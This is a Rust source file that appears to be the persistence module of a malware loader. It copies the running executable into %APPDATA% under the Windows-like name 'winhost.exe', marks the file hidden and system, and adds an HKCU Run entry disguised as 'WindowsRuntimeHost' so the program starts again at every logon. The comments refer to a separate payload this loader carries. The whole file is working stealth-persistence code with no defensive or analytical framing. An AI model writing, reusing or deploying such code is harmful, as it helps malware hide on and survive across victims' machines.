//! Loader self-persistence for the temp-exec strategy.
//! Copies the loader to %APPDATA%, marks it hidden, and sets HKCU Run.
//! The plaintext payload is never copied — only this loader is.
#![allow(dead_code)]

use std::path::PathBuf;

use windows::core::PCWSTR;
use windows::Win32::Foundation::ERROR_SUCCESS;
use windows::Win32::Storage::FileSystem::{
    SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM,
};
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_WRITE,
    REG_OPTION_NON_VOLATILE, REG_SZ,
};

const RUN_VALUE_NAME: &str = "WindowsRuntimeHost";
const INSTALL_DIR: &str = "Microsoft\\WindowsRuntime";
const INSTALL_BIN: &str = "winhost.exe";

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn install_path() -> Option<PathBuf> {
    let appdata = std::env::var_os("APPDATA")?;
    let mut p = PathBuf::from(appdata);
    p.push(INSTALL_DIR);
    p.push(INSTALL_BIN);
    Some(p)
}

/// Idempotent: copy loader to %APPDATA% + HKCU Run, or just re-assert the key.
pub fn install_self() {
    let Some(dst) = install_path() else { return };
    let cur = match std::env::current_exe() {
        Ok(c) => c,
        Err(_) => return,
    };
    if cur == dst {
        set_run_key(&dst);
        return;
    }
    if let Some(parent) = dst.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if std::fs::copy(&cur, &dst).is_err() {
        return;
    }
    hide(&dst);
    set_run_key(&dst);
}

fn hide(p: &PathBuf) {
    let w = wide(&p.to_string_lossy());
    unsafe {
        let _ = SetFileAttributesW(
            PCWSTR(w.as_ptr()),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        );
    }
}

fn set_run_key(dst: &PathBuf) {
    unsafe {
        let sub = wide(r"Software\Microsoft\Windows\CurrentVersion\Run");
        let mut key = HKEY::default();
        if RegCreateKeyExW(
            HKEY_CURRENT_USER,
            PCWSTR(sub.as_ptr()),
            0,
            PCWSTR::null(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            None,
            &mut key,
            None,
        ) != ERROR_SUCCESS
        {
            return;
        }
        let val = wide(&format!("\"{}\"", dst.to_string_lossy()));
        let bytes: &[u8] = std::slice::from_raw_parts(val.as_ptr() as *const u8, val.len() * 2);
        let name = wide(RUN_VALUE_NAME);
        let _ = RegSetValueExW(key, PCWSTR(name.as_ptr()), 0, REG_SZ, Some(bytes));
        let _ = RegCloseKey(key);
    }
}
